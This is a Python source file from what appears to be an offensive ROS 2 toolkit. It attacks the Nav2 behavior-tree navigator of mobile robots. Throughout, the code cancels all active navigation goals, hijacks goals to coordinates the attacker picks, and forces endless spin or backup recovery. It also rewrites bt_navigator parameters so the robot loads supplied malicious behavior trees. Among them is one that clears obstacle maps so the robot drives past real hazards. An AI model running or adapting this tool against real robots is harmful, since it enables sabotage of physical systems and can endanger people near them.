#!/usr/bin/env python3
"""
behavior_tree_hijacker.py - Phase 5C Module 3: Nav2 Behavior Tree Exploitation

Attacks the Nav2 behavior tree (BT) execution engine — the logic layer that
determines HOW the robot responds to navigation requests. While Phase 2 injects
raw goals at the topic level, this module targets the BT action server protocol
and the bt_navigator node's configuration, enabling:

  - Goal cancellation: abort in-flight navigation missions mid-execution
  - Goal substitution: accept an action client's goal, then redirect to
    attacker-chosen coordinates before the BT executes it
  - Recovery abuse: force specific recovery behaviors (spin, backup) in a
    continuous loop that consumes execution time and confuses operators
  - BT parameter hijacking: change bt_xml_filename or plugin parameters
    so the next CONFIGURE cycle loads an attacker-supplied behavior tree
  - Malicious BT generation: produce BT XML files that implement unsafe
    or deceptive navigation behaviors (no-replanning, infinite retry loops,
    forced unsafe recovery sequences)

Nav2 Behavior Tree Architecture:
  bt_navigator subscribes to the NavigateToPose action server:
    Action: /navigate_to_pose (nav2_msgs/action/NavigateToPose)
    Action: /navigate_through_poses (nav2_msgs/action/NavigateThroughPoses)
    Action: /follow_waypoints (nav2_msgs/action/FollowWaypoints)

  The BT is loaded from an XML file specified in the bt_xml_filename parameter.
  At runtime, the BT XML is parsed by BehaviorTree.CPP and executed in a loop
  at bt_loop_duration frequency (default: 10ms).

  Standard BT nodes used by Nav2:
    ComputePathToPose     — calls planner_server to compute a path
    FollowPath            — calls controller_server to execute the path
    ClearEntireCostmap    — clears the global costmap
    Spin                  — recovery: spin in place
    BackUp                — recovery: back up a fixed distance
    Wait                  — recovery: wait for specified duration
    RateController        — throttles BT execution frequency
    RecoveryNode          — handles failure → recovery → retry sequencing

  Key attack paths:
    1. bt_xml_filename parameter → replace BT file before next Configure cycle
    2. /_action/cancel_goal → abort active NavigateToPose immediately
    3. Goal redirect: intercept goal, respond with feedback, re-issue to new coords
    4. Recovery loop: send repeated goals that always fail → stuck in recovery
    5. BT loop duration = 0 → divides by zero in some BT.CPP versions (DoS)

ROS 2 Action Protocol:
  Actions use three DDS topics per action:
    rt/<action>/_action/send_goal      (request goal)
    rt/<action>/_action/cancel_goal    (cancel active goal)
    rt/<action>/_action/get_result     (get final result)
    rt/<action>/_action/feedback       (streaming feedback)
    rt/<action>/_action/status         (goal state machine)

Author: Gh057x | Phase 5C
"""

import time
import json
import sys
import os
import argparse
import struct
import random
import math
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Any, Tuple
from datetime import datetime
from enum import Enum


# =============================================================================
# Constants
# =============================================================================

class BTAttackMode(str, Enum):
    ENUMERATE  = "enumerate"
    CANCEL     = "cancel"
    REDIRECT   = "redirect"
    RECOVERY_LOOP = "recovery_loop"
    PARAM_HIJACK  = "param_hijack"
    GENERATE_BT   = "generate_bt"


# Nav2 action names
ACTION_NAVIGATE_TO_POSE       = "/navigate_to_pose"
ACTION_NAVIGATE_THROUGH_POSES = "/navigate_through_poses"
ACTION_FOLLOW_WAYPOINTS       = "/follow_waypoints"
ACTION_SPIN                   = "/spin"
ACTION_BACKUP                 = "/backup"
ACTION_WAIT                   = "/wait"
ACTION_COMPUTE_PATH           = "/compute_path_to_pose"
ACTION_FOLLOW_PATH            = "/follow_path"

BT_NAVIGATOR_NODE = "/bt_navigator"

# Standard BT parameters in bt_navigator
BT_PARAMS = {
    "bt_xml_filename":           "Path to BT XML file (primary attack target)",
    "default_bt_xml_filename":   "Default BT XML path if main not found",
    "bt_loop_duration":          "BT execution loop duration in ms (set to 0 → DoS)",
    "server_timeout":            "Action server response timeout",
    "wait_for_service_timeout":  "Service wait timeout",
    "action_server_result_timeout": "Result timeout before cleanup",
}

# Recovery behavior action parameters
RECOVERY_MODES = {
    "spin":   {"action": ACTION_SPIN,   "description": "Rotate in place"},
    "backup": {"action": ACTION_BACKUP, "description": "Reverse straight backward"},
    "wait":   {"action": ACTION_WAIT,   "description": "Pause in place"},
}

# Malicious BT XML templates
BT_MALICIOUS_TEMPLATES = {
    "no_recovery": """<?xml version="1.0"?>
<root main_tree_to_execute="MainTree">
  <BehaviorTree ID="MainTree">
    <Sequence name="navigate_w_recovery">
      <RateController hz="1.0">
        <Sequence name="navigate_subtree">
          <ComputePathToPose goal="{goal}" path="{path}" planner_id="GridBased"/>
          <FollowPath path="{path}" controller_id="FollowPath"/>
        </Sequence>
      </RateController>
    </Sequence>
  </BehaviorTree>
</root>""",

    "infinite_retry": """<?xml version="1.0"?>
<root main_tree_to_execute="MainTree">
  <BehaviorTree ID="MainTree">
    <RecoveryNode number_of_retries="999999" name="NavigateRecovery">
      <Sequence name="navigate_subtree">
        <ComputePathToPose goal="{goal}" path="{path}" planner_id="GridBased"/>
        <FollowPath path="{path}" controller_id="FollowPath"/>
      </Sequence>
      <SequenceStar name="recovery_sequence">
        <RateController hz="1.0">
          <Spin spin_dist="1.57"/>
        </RateController>
        <RateController hz="1.0">
          <BackUp backup_dist="0.15" backup_speed="0.025"/>
        </RateController>
      </SequenceStar>
    </RecoveryNode>
  </BehaviorTree>
</root>""",

    "spin_only": """<?xml version="1.0"?>
<root main_tree_to_execute="MainTree">
  <BehaviorTree ID="MainTree">
    <Sequence name="spin_attack">
      <RateController hz="10.0">
        <Spin spin_dist="6.283185"/>
      </RateController>
    </Sequence>
  </BehaviorTree>
</root>""",

    "clear_and_navigate": """<?xml version="1.0"?>
<root main_tree_to_execute="MainTree">
  <BehaviorTree ID="MainTree">
    <Sequence name="navigate_w_obstacle_clear">
      <ClearEntireCostmap service_name="global_costmap/clear_entirely_global_costmap"/>
      <ClearEntireCostmap service_name="local_costmap/clear_entirely_local_costmap"/>
      <ComputePathToPose goal="{goal}" path="{path}" planner_id="GridBased"/>
      <FollowPath path="{path}" controller_id="FollowPath"/>
    </Sequence>
  </BehaviorTree>
</root>""",

    "goal_checker_bypass": """<?xml version="1.0"?>
<root main_tree_to_execute="MainTree">
  <BehaviorTree ID="MainTree">
    <PipelineSequence name="NavigateWithReplanning">
      <RateController hz="1.0">
        <ComputePathToPose goal="{goal}" path="{path}" planner_id="GridBased"
                            error_code_id="{compute_path_error_code}"/>
      </RateController>
      <FollowPath path="{path}" controller_id="FollowPath"
                  error_code_id="{follow_path_error_code}"/>
    </PipelineSequence>
  </BehaviorTree>
</root>""",
}


# =============================================================================
# Data Structures
# =============================================================================

@dataclass
class BTInfo:
    """Information about a Nav2 bt_navigator configuration."""
    node_name: str = BT_NAVIGATOR_NODE
    bt_xml_filename: str = ""
    default_bt_xml_filename: str = ""
    bt_loop_duration: int = 10
    active_goals: List[str] = field(default_factory=list)
    actions_available: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict:
        return {
            "node_name": self.node_name,
            "bt_xml_filename": self.bt_xml_filename,
            "default_bt_xml_filename": self.default_bt_xml_filename,
            "bt_loop_duration": self.bt_loop_duration,
            "active_goals": self.active_goals,
            "actions_available": self.actions_available,
        }


@dataclass
class BTAttackResult:
    mode: str
    target: str
    namespace: str
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    bt_info: Optional[BTInfo] = None
    goals_cancelled: int = 0
    goals_redirected: int = 0
    recovery_cycles: int = 0
    params_hijacked: Dict[str, Any] = field(default_factory=dict)
    bt_xml_generated: Optional[str] = None
    bt_template_used: str = ""
    success: bool = False
    attack_log: List[str] = field(default_factory=list)

    def log(self, msg: str):
        ts = datetime.now().strftime("%H:%M:%S.%f")[:12]
        self.attack_log.append(f"[{ts}] {msg}")

    def to_dict(self) -> Dict:
        return {
            "mode": self.mode, "target": self.target, "namespace": self.namespace,
            "timestamp": self.timestamp,
            "bt_info": self.bt_info.to_dict() if self.bt_info else None,
            "goals_cancelled": self.goals_cancelled,
            "goals_redirected": self.goals_redirected,
            "recovery_cycles": self.recovery_cycles,
            "params_hijacked": self.params_hijacked,
            "bt_template_used": self.bt_template_used,
            "bt_xml_generated": self.bt_xml_generated,
            "success": self.success,
            "attack_log": self.attack_log,
        }


# =============================================================================
# BT Hijacker
# =============================================================================

class BehaviorTreeHijacker:
    """
    Exploits the Nav2 behavior tree navigator.
    Full attack capability requires rclpy; BT XML generation works standalone.
    """

    def __init__(self, namespace: str = "", domain_id: int = 0,
                 verbose: bool = False, timeout: float = 5.0):
        self.namespace = namespace
        self.domain_id = domain_id
        self.verbose   = verbose
        self.timeout   = timeout
        self._node     = None
        self._rclpy_ok = False
        self._try_init_rclpy()

    def _try_init_rclpy(self):
        try:
            import rclpy
            if not rclpy.ok():
                rclpy.init(domain_id=self.domain_id)
            self._node = rclpy.create_node(
                "ros2reaper_bt_hijacker", namespace=self.namespace
            )
            self._rclpy_ok = True
        except ImportError:
            pass
        except Exception as e:
            if self.verbose:
                print(f"  [!] rclpy: {e}")

    # ─────────────────────────────────────────────────────────────────────────
    # Enumeration
    # ─────────────────────────────────────────────────────────────────────────

    def enumerate_bt(self, result: BTAttackResult) -> BTInfo:
        """Enumerate bt_navigator configuration and active goals."""
        info = BTInfo()

        if not self._rclpy_ok:
            result.log("[!] rclpy not available — BT enumeration limited")
            return info

        # Query bt_navigator parameters
        for param_name in ["bt_xml_filename", "default_bt_xml_filename", "bt_loop_duration"]:
            val = self._get_parameter(BT_NAVIGATOR_NODE, param_name)
            if val is not None:
                setattr(info, param_name, val)
                result.log(f"  {param_name} = {val!r}")

        # List available actions
        try:
            action_list = self._node.get_topic_names_and_types()
            for topic, types in action_list:
                for t in types:
                    if "action_msgs" in t or "nav2_msgs" in t:
                        if "_action" in topic:
                            info.actions_available.append(topic)
        except Exception:
            pass

        result.bt_info = info
        return info

    def _get_parameter(self, node_name: str, param_name: str) -> Optional[Any]:
        """Read a parameter from a ROS 2 node via the parameter service."""
        try:
            from rcl_interfaces.srv import GetParameters
            import rclpy

            client = self._node.create_client(GetParameters, f"{node_name}/get_parameters")
            if not client.wait_for_service(timeout_sec=self.timeout):
                return None

            req = GetParameters.Request()
            req.names = [param_name]
            fut = client.call_async(req)
            rclpy.spin_until_future_complete(self._node, fut, timeout_sec=self.timeout)
            if fut.done() and fut.result() and fut.result().values:
                pv = fut.result().values[0]
                from rcl_interfaces.msg import ParameterType
                type_map = {
                    ParameterType.PARAMETER_BOOL:    pv.bool_value,
                    ParameterType.PARAMETER_INTEGER:  pv.integer_value,
                    ParameterType.PARAMETER_DOUBLE:   pv.double_value,
                    ParameterType.PARAMETER_STRING:   pv.string_value,
                }
                return type_map.get(pv.type)
        except Exception:
            pass
        return None

    # ─────────────────────────────────────────────────────────────────────────
    # Goal Cancellation
    # ─────────────────────────────────────────────────────────────────────────

    def cancel_active_goals(self, result: BTAttackResult,
                             actions: Optional[List[str]] = None) -> bool:
        """
        Cancel all active navigation goals on the specified action servers.
        Sends CancelGoal requests with an empty goal_id (cancels ALL goals).
        """
        if not self._rclpy_ok:
            result.log("[!] rclpy required for action cancellation")
            return False

        targets = actions or [ACTION_NAVIGATE_TO_POSE,
                               ACTION_NAVIGATE_THROUGH_POSES,
                               ACTION_FOLLOW_WAYPOINTS]
        any_success = False

        for action_name in targets:
            result.log(f"Cancelling all goals on: {action_name}")
            try:
                from action_msgs.srv import CancelGoal
                from action_msgs.msg import GoalInfo
                from builtin_interfaces.msg import Time
                import rclpy

                svc_name = f"{action_name}/_action/cancel_goal"
                client = self._node.create_client(CancelGoal, svc_name)
                if not client.wait_for_service(timeout_sec=self.timeout):
                    result.log(f"  [-] {svc_name} not available")
                    continue

                req = CancelGoal.Request()
                # Empty goal_info → cancel ALL goals
                req.goal_info.goal_id.uuid = [0] * 16
                req.goal_info.stamp.sec = 0
                req.goal_info.stamp.nanosec = 0

                fut = client.call_async(req)
                rclpy.spin_until_future_complete(self._node, fut, timeout_sec=self.timeout)

                if fut.done() and fut.result():
                    n = len(fut.result().goals_canceling)
                    result.goals_cancelled += n
                    result.log(f"  [+] {n} goal(s) cancelled on {action_name}")
                    any_success = True
                else:
                    result.log(f"  [-] No active goals or cancel failed on {action_name}")

            except Exception as e:
                result.log(f"  [!] cancel error on {action_name}: {e}")

        return any_success

    # ─────────────────────────────────────────────────────────────────────────
    # Goal Redirection
    # ─────────────────────────────────────────────────────────────────────────

    def redirect_goals(self, result: BTAttackResult,
                        redirect_x: float = 0.0, redirect_y: float = 0.0,
                        redirect_yaw: float = 0.0,
                        duration: float = 30.0) -> bool:
        """
        Intercept NavigateToPose goals and re-issue them to attacker-chosen coordinates.
        Works by:
          1. Subscribing to the /navigate_to_pose/_action/status topic to detect active goals
          2. Cancelling the active goal
          3. Publishing a new NavigateToPose goal to the attacker-chosen destination

        Full interception (man-in-the-middle at the action level) requires rclpy.
        """
        if not self._rclpy_ok:
            result.log("[!] rclpy required for goal redirection")
            return False

        result.log(f"REDIRECT: monitoring goals → redirecting to ({redirect_x},{redirect_y},{redirect_yaw})")
        print(f"[*] Monitoring NavigateToPose for {duration}s...")
        print(f"[*] Any goal detected will be cancelled and redirected to "
              f"({redirect_x:.2f}, {redirect_y:.2f})")

        try:
            from nav2_msgs.action import NavigateToPose
            from geometry_msgs.msg import PoseStamped
            import rclpy

            # Action client to re-issue goals
            from rclpy.action import ActionClient
            ac = ActionClient(self._node, NavigateToPose, ACTION_NAVIGATE_TO_POSE)
            if not ac.wait_for_server(timeout_sec=self.timeout):
                result.log("[-] NavigateToPose action server not available")
                return False

            start = time.time()
            redirected = 0

            def _on_status(msg):
                nonlocal redirected
                for status in msg.status_list:
                    # EXECUTING = 2, CANCELING = 4
                    if status.status in (2,):
                        result.log(f"  [*] Active goal detected: {status.goal_info.goal_id}")
                        # Cancel it
                        self.cancel_active_goals(result, [ACTION_NAVIGATE_TO_POSE])
                        # Re-issue to attacker destination
                        goal_msg = NavigateToPose.Goal()
                        goal_msg.pose.header.frame_id = "map"
                        goal_msg.pose.header.stamp = self._node.get_clock().now().to_msg()
                        goal_msg.pose.pose.position.x = redirect_x
                        goal_msg.pose.pose.position.y = redirect_y
                        # Yaw → quaternion
                        goal_msg.pose.pose.orientation.z = math.sin(redirect_yaw / 2)
                        goal_msg.pose.pose.orientation.w = math.cos(redirect_yaw / 2)
                        ac.send_goal_async(goal_msg)
                        redirected += 1
                        result.goals_redirected += 1
                        result.log(f"  [+] Goal redirected → ({redirect_x:.2f},{redirect_y:.2f})")

            from action_msgs.msg import GoalStatusArray
            sub = self._node.create_subscription(
                GoalStatusArray,
                f"{ACTION_NAVIGATE_TO_POSE}/_action/status",
                _on_status, 10
            )

            while time.time() - start < duration:
                rclpy.spin_once(self._node, timeout_sec=0.1)

            return redirected > 0

        except Exception as e:
            result.log(f"  [!] redirect error: {e}")
            return False

    # ─────────────────────────────────────────────────────────────────────────
    # Recovery Loop Abuse
    # ─────────────────────────────────────────────────────────────────────────

    def trigger_recovery_loop(self, result: BTAttackResult,
                               recovery_mode: str = "spin",
                               cycles: int = 10,
                               duration: float = 30.0) -> bool:
        """
        Force the robot into a continuous recovery behavior loop.
        Uses the recovery action servers directly:
          /spin    — rotate in place (spin_dist radians)
          /backup  — back up (backup_dist metres)
          /wait    — wait (wait_duration seconds)
        Sending these directly bypasses normal BT recovery logic.
        """
        if not self._rclpy_ok:
            result.log("[!] rclpy required for recovery actions")
            return False

        action_name = RECOVERY_MODES[recovery_mode]["action"]
        result.log(f"RECOVERY LOOP: {recovery_mode} × {cycles} via {action_name}")

        try:
            import rclpy
            from rclpy.action import ActionClient
            success = False

            if recovery_mode == "spin":
                from nav2_msgs.action import Spin
                ac = ActionClient(self._node, Spin, action_name)
                if not ac.wait_for_server(timeout_sec=self.timeout):
                    result.log("[-] /spin action server not available")
                    return False
                for i in range(cycles):
                    if time.time() > time.time() + duration:
                        break
                    goal = Spin.Goal()
                    goal.target_yaw = math.pi * 2  # full rotation
                    fut = ac.send_goal_async(goal)
                    rclpy.spin_until_future_complete(self._node, fut, timeout_sec=self.timeout)
                    if fut.result():
                        result_fut = fut.result().get_result_async()
                        rclpy.spin_until_future_complete(self._node, result_fut, timeout_sec=10.0)
                    result.recovery_cycles += 1
                    if self.verbose:
                        print(f"  [+] Spin #{i+1}/{cycles} completed")
                    success = True

            elif recovery_mode == "backup":
                from nav2_msgs.action import BackUp
                ac = ActionClient(self._node, BackUp, action_name)
                if not ac.wait_for_server(timeout_sec=self.timeout):
                    result.log("[-] /backup action server not available")
                    return False
                for i in range(cycles):
                    goal = BackUp.Goal()
                    goal.target = __import__("geometry_msgs.msg", fromlist=["Point"]).Point()
                    goal.target.x = 0.15
                    goal.speed = 0.025
                    fut = ac.send_goal_async(goal)
                    rclpy.spin_until_future_complete(self._node, fut, timeout_sec=self.timeout)
                    result.recovery_cycles += 1
                    success = True

            elif recovery_mode == "wait":
                from nav2_msgs.action import Wait
                ac = ActionClient(self._node, Wait, action_name)
                if not ac.wait_for_server(timeout_sec=self.timeout):
                    result.log("[-] /wait action server not available")
                    return False
                goal = Wait.Goal()
                goal.time.sec = int(duration)
                fut = ac.send_goal_async(goal)
                rclpy.spin_until_future_complete(self._node, fut, timeout_sec=self.timeout)
                result.recovery_cycles += 1
                success = True

            result.log(f"  [+] {result.recovery_cycles} recovery cycles executed")
            return success

        except Exception as e:
            result.log(f"  [!] recovery loop error: {e}")
            return False

    # ─────────────────────────────────────────────────────────────────────────
    # BT Parameter Hijacking
    # ─────────────────────────────────────────────────────────────────────────

    def hijack_bt_params(self, result: BTAttackResult,
                          bt_xml_path: str = "/tmp/malicious.xml",
                          loop_duration_ms: int = 99999) -> bool:
        """
        Poison bt_navigator parameters so the next lifecycle CONFIGURE cycle
        loads an attacker-controlled BT XML or enters an error state.
        """
        if not self._rclpy_ok:
            result.log("[!] rclpy required for parameter manipulation")
            return False

        params_to_set = {
            "bt_xml_filename": bt_xml_path,
            "default_bt_xml_filename": bt_xml_path,
            "bt_loop_duration": loop_duration_ms,
        }

        try:
            from rcl_interfaces.srv import SetParameters
            from rcl_interfaces.msg import Parameter, ParameterValue, ParameterType
            import rclpy

            client = self._node.create_client(SetParameters, f"{BT_NAVIGATOR_NODE}/set_parameters")
            if not client.wait_for_service(timeout_sec=self.timeout):
                result.log("[-] bt_navigator set_parameters not available")
                return False

            ros_params = []
            for name, val in params_to_set.items():
                p = Parameter()
                p.name = name
                pv = ParameterValue()
                if isinstance(val, int):
                    pv.type = ParameterType.PARAMETER_INTEGER
                    pv.integer_value = val
                elif isinstance(val, str):
                    pv.type = ParameterType.PARAMETER_STRING
                    pv.string_value = val
                p.value = pv
                ros_params.append(p)

            req = SetParameters.Request()
            req.parameters = ros_params
            fut = client.call_async(req)
            rclpy.spin_until_future_complete(self._node, fut, timeout_sec=self.timeout)

            if fut.done() and fut.result():
                success_count = sum(1 for r in fut.result().results if r.successful)
                result.params_hijacked.update(params_to_set)
                result.log(f"  [+] {success_count}/{len(params_to_set)} BT params set")
                result.log(f"  [!] Next CONFIGURE cycle will load: {bt_xml_path}")
                return success_count > 0

        except Exception as e:
            result.log(f"  [!] BT param hijack error: {e}")
        return False

    # ─────────────────────────────────────────────────────────────────────────
    # Malicious BT XML Generation
    # ─────────────────────────────────────────────────────────────────────────

    def generate_malicious_bt(self, template: str = "spin_only",
                               output_path: Optional[str] = None) -> str:
        """
        Generate a malicious BT XML file from built-in templates.
        Templates:
          spin_only        — Replace nav BT with continuous spinning
          no_recovery      — Disable all recovery behaviors (crash → stop)
          infinite_retry   — Infinite retry loop → stuck navigation state
          clear_and_navigate — Clear all obstacles then navigate (ignore real hazards)
          goal_checker_bypass — Remove goal-reached tolerance check
        """
        xml = BT_MALICIOUS_TEMPLATES.get(template, BT_MALICIOUS_TEMPLATES["no_recovery"])

        if output_path:
            with open(output_path, "w") as f:
                f.write(xml)
            print(f"[+] Malicious BT XML written to {output_path}")
            print(f"    Deploy with: sros2-policy param_hijack --bt-xml-path {output_path}")

        return xml

    # ─────────────────────────────────────────────────────────────────────────
    # Orchestration
    # ─────────────────────────────────────────────────────────────────────────

    def run(self, mode: BTAttackMode,
             redirect_x: float = 0.0, redirect_y: float = 0.0, redirect_yaw: float = 0.0,
             recovery_mode: str = "spin", recovery_cycles: int = 5,
             bt_xml_path: str = "/tmp/malicious_bt.xml",
             bt_template: str = "spin_only",
             bt_output: Optional[str] = None,
             duration: float = 30.0,
             target: str = "") -> BTAttackResult:

        result = BTAttackResult(mode=mode.value, target=target, namespace=self.namespace)
        result.log(f"BT hijack: mode={mode.value}  rclpy={self._rclpy_ok}")

        if mode == BTAttackMode.ENUMERATE:
            result.bt_info = self.enumerate_bt(result)
            result.success = result.bt_info is not None

        elif mode == BTAttackMode.CANCEL:
            result.success = self.cancel_active_goals(result)

        elif mode == BTAttackMode.REDIRECT:
            result.success = self.redirect_goals(
                result, redirect_x, redirect_y, redirect_yaw, duration
            )

        elif mode == BTAttackMode.RECOVERY_LOOP:
            result.success = self.trigger_recovery_loop(
                result, recovery_mode, recovery_cycles, duration
            )

        elif mode == BTAttackMode.PARAM_HIJACK:
            # Generate BT XML first, then point bt_navigator at it
            xml = self.generate_malicious_bt(bt_template, bt_xml_path)
            result.bt_xml_generated = xml
            result.bt_template_used = bt_template
            result.success = self.hijack_bt_params(result, bt_xml_path)

        elif mode == BTAttackMode.GENERATE_BT:
            xml = self.generate_malicious_bt(bt_template, bt_output or bt_xml_path)
            result.bt_xml_generated = xml
            result.bt_template_used = bt_template
            result.success = bool(xml)

        if self._node:
            try:
                self._node.destroy_node()
            except Exception:
                pass

        return result


# =============================================================================
# Output
# =============================================================================

CYAN    = "\033[96m"
GREEN   = "\033[92m"
YELLOW  = "\033[93m"
RED     = "\033[91m"
DIM     = "\033[90m"
RESET   = "\033[0m"
BOLD    = "\033[1m"


def print_bt_report(result: BTAttackResult):
    print(f"\n{'=' * 65}")
    print(f"  {BOLD}BEHAVIOR TREE HIJACK REPORT{RESET}")
    print(f"{'=' * 65}")
    print(f"  Mode:      {result.mode.upper()}")
    print(f"  Target:    {result.target or 'local'}")
    print(f"  Timestamp: {result.timestamp}")
    print(f"{'─' * 65}")

    if result.bt_info:
        i = result.bt_info
        print(f"\n  {BOLD}BT Navigator Config{RESET}")
        print(f"  BT XML:          {YELLOW}{i.bt_xml_filename or 'not found'}{RESET}")
        print(f"  Default BT XML:  {DIM}{i.default_bt_xml_filename or 'not set'}{RESET}")
        print(f"  BT Loop (ms):    {i.bt_loop_duration}")
        if i.actions_available:
            print(f"  Action topics:   {len(i.actions_available)}")

    if result.goals_cancelled:
        print(f"\n  {GREEN}[+]{RESET} Goals cancelled: {result.goals_cancelled}")
    if result.goals_redirected:
        print(f"\n  {RED}[+]{RESET} Goals redirected: {result.goals_redirected}")
    if result.recovery_cycles:
        print(f"\n  {YELLOW}[+]{RESET} Recovery cycles forced: {result.recovery_cycles}")

    if result.params_hijacked:
        print(f"\n  {BOLD}Parameters Hijacked{RESET}")
        for k, v in result.params_hijacked.items():
            print(f"    {RED}{k}{RESET} → {v!r}")
        print(f"  {YELLOW}[!] Next CONFIGURE cycle will load attacker BT XML{RESET}")

    if result.bt_xml_generated:
        print(f"\n  {BOLD}Generated BT XML ({result.bt_template_used}){RESET}")
        preview = result.bt_xml_generated[:400]
        print(f"  {DIM}{preview}{RESET}")
        if len(result.bt_xml_generated) > 400:
            print(f"  {DIM}... ({len(result.bt_xml_generated)} total chars){RESET}")

    if result.attack_log:
        print(f"\n  {BOLD}Log{RESET}")
        for entry in result.attack_log[-12:]:
            print(f"    {DIM}{entry}{RESET}")

    sc = GREEN if result.success else RED
    print(f"\n  Status: {sc}{'SUCCESS' if result.success else 'FAILED/RECON'}{RESET}")
    print(f"{'=' * 65}\n")


def export_json(result: BTAttackResult, path: str):
    with open(path, "w") as f:
        # Don't include full BT XML in JSON (too large); just metadata
        d = result.to_dict()
        if d.get("bt_xml_generated") and len(d["bt_xml_generated"]) > 500:
            d["bt_xml_generated"] = d["bt_xml_generated"][:200] + "...(truncated)"
        json.dump(d, f, indent=2)
    print(f"[+] BT hijack results saved to {path}")


# =============================================================================
# Standalone CLI
# =============================================================================

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Nav2 BT Hijacker (Phase 5C Module 3)")
    parser.add_argument("--mode", choices=[m.value for m in BTAttackMode], default="enumerate")
    parser.add_argument("--target", "-t", default="")
    parser.add_argument("--namespace", default="")
    parser.add_argument("--domain-id", "-d", type=int, default=0)
    parser.add_argument("--duration",  type=float, default=30.0)
    parser.add_argument("--redirect-x",   type=float, default=0.0)
    parser.add_argument("--redirect-y",   type=float, default=0.0)
    parser.add_argument("--redirect-yaw", type=float, default=0.0)
    parser.add_argument("--recovery-mode", choices=["spin","backup","wait"], default="spin")
    parser.add_argument("--recovery-cycles", type=int, default=5)
    parser.add_argument("--bt-xml-path", default="/tmp/malicious_bt.xml")
    parser.add_argument("--bt-template",
                        choices=list(BT_MALICIOUS_TEMPLATES.keys()),
                        default="spin_only")
    parser.add_argument("--bt-output", default=None)
    parser.add_argument("-o", "--output")
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    hijacker = BehaviorTreeHijacker(
        namespace=args.namespace, domain_id=args.domain_id,
        verbose=args.verbose, timeout=5.0,
    )
    result = hijacker.run(
        mode=BTAttackMode(args.mode),
        redirect_x=args.redirect_x, redirect_y=args.redirect_y,
        redirect_yaw=args.redirect_yaw,
        recovery_mode=args.recovery_mode,
        recovery_cycles=args.recovery_cycles,
        bt_xml_path=args.bt_xml_path,
        bt_template=args.bt_template,
        bt_output=args.bt_output,
        duration=args.duration,
        target=args.target,
    )
    print_bt_report(result)
    if args.output:
        export_json(result, args.output)
